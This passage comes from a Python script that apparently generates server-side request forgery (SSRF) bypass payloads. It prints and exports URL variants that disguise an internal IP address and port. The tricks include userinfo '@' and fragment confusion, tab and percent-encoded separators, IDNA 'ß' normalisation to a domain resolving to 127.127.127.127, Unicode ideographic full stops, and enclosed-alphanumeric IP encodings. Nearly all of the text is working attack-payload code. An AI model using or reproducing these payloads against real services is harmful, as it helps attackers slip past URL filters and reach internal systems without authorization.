print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP12,':',PORT,'/',sep='')
print('http://',IP12,':',PORT,':80','/',sep='')
print('http://',IP12,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP12,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP12,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP12,':',PORT,'/',file=f,sep='')
	print('http://',IP12,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP12,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP12,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP12,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP12,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',file=f,sep='')
	print('http://',IP12,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP12,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP12,':',PORT,'/',file=f,sep='')
	print('http://',IP12,':',PORT,':80','/',file=f,sep='')
	print('http://',IP12,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP12,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP12,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 13 - Abusing IDNA Standard
print(bluecolor,"Abusing IDNA Standard: ",resetcolor,yellowcolor,"http://ß.localdomain.pw/", resetcolor,' -> ',yellowcolor,'http://cc.localdomain.pw/',resetcolor,' => ',bluecolor,'DNS',resetcolor,' => ',yellowcolor,'127.127.127.127',resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print('http://ß.localdomain.pw/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://ß.localdomain.pw/',file=f,sep='')

#Case 14 - Abusing 。and ｡
IPAddressParts = arg1.split(".")
print(bluecolor,"Abusing 。and ｡: ",resetcolor,yellowcolor,"http://",IPAddressParts[0],"。",IPAddressParts[1],"。",IPAddressParts[2],"。",IPAddressParts[3],"/",resetcolor," and " ,yellowcolor,"http://",IPAddressParts[0],"｡",IPAddressParts[1],"｡",IPAddressParts[2],"｡",IPAddressParts[3],"/", resetcolor,' -> ',yellowcolor,"http://",IPAddressParts[0],".",IPAddressParts[1],".",IPAddressParts[2],".",IPAddressParts[3],"/",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print('http://',IPAddressParts[0],'。',IPAddressParts[1],'。',IPAddressParts[2],'。',IPAddressParts[3],'/',sep='')
print('http://',IPAddressParts[0],'｡',IPAddressParts[1],'｡',IPAddressParts[2],'｡',IPAddressParts[3],'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IPAddressParts[0],'。',IPAddressParts[1],'。',IPAddressParts[2],'。',IPAddressParts[3],'/',file=f,sep='')
	print('http://',IPAddressParts[0],'｡',IPAddressParts[1],'｡',IPAddressParts[2],'｡',IPAddressParts[3],'/',file=f,sep='')

#Case 15 Abusing Enclosed Alphanumerics
print(bluecolor,"Abusing Enclosed Alphanumerics:",resetcolor," ",yellowcolor,'http://',convertIP2EnclosedAlphanumericsValue(), resetcolor,'        -> ',yellowcolor,"http://",arg1,resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print('http://',convertIP2EnclosedAlphanumericsValue(),'/',sep='')
print('http://',convert_ip(IP1),':',PORT,'/',sep='')
print('http://',convert_ip(IP2),':',PORT,'/',sep='')
print('http://',convert_ip(IP3),':',PORT,'/',sep='')
print('http://',convert_ip(IP4),':',PORT,'/',sep='')
print('http://',convert_ip(IP5),':',PORT,'/',sep='')
print('http://',convert_ip(IP6),':',PORT,'/',sep='')
print('http://',convert_ip(IP7),':',PORT,'/',sep='')
print('http://',convert_ip(IP8),':',PORT,'/',sep='')
print('http://',convert_ip(IP9),':',PORT,'/',sep='')
print('http://',convert_ip(IP10),':',PORT,'/',sep='')
print('http://',convert_ip(IP11),':',PORT,'/',sep='')
print('http://',convert_ip(IP12),':',PORT,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',convertIP2EnclosedAlphanumericsValue(),'/',file=f,sep='')
	print('http://',convert_ip(IP1),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP2),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP3),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP4),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP5),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP6),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP7),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP8),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP9),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP10),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP11),':',PORT,'/',file=f,sep='')
	print('http://',convert_ip(IP12),':',PORT,'/',file=f,sep='')

if EXPORTRESULTS == 'export':
	f.close()
	print("\n",bluecolor,'-----------------------------------------------------------------------------------------------------------------------------------------',resetcolor,sep='')
	print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
	print("Results are exported to: " + FILENAME,sep='')
	print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
	print(bluecolor,'-----------------------------------------------------------------------------------------------------------------------------------------',resetcolor,sep='')
	print("\n",sep='')
